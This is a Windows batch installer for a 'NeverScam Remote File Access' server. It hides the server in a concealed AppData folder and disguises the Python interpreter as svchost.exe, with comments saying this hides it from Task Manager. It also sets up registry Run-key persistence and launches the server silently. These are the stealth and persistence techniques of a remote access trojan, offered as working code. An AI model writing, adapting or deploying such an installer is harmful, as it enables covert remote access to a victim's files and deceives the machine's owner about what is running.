@echo off
REM NeverScam Remote File Access - Host Setup
REM This script installs the server to run hidden in the background

REM Create hidden directory in AppData
if not exist "%APPDATA%\NeverScam" mkdir "%APPDATA%\NeverScam" >nul 2>&1
attrib +h "%APPDATA%\NeverScam" >nul 2>&1

REM Copy server script to hidden location
copy "%~dp0server.py" "%APPDATA%\NeverScam\server.py" >nul 2>&1

REM Copy pythonw.exe to a disguised name to hide from Task Manager
copy "%SystemRoot%\System32\pythonw.exe" "%APPDATA%\NeverScam\svchost.exe" >nul 2>&1

REM Add to startup registry (using disguised executable)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NeverScamServer /t REG_SZ /d "\"%APPDATA%\NeverScam\svchost.exe\" \"%APPDATA%\NeverScam\server.py\"" /f >nul 2>&1

REM Run the server hidden immediately with disguised name
start /B "" "%APPDATA%\NeverScam\svchost.exe" "%APPDATA%\NeverScam\server.py" >nul 2>&1

exit /b 0

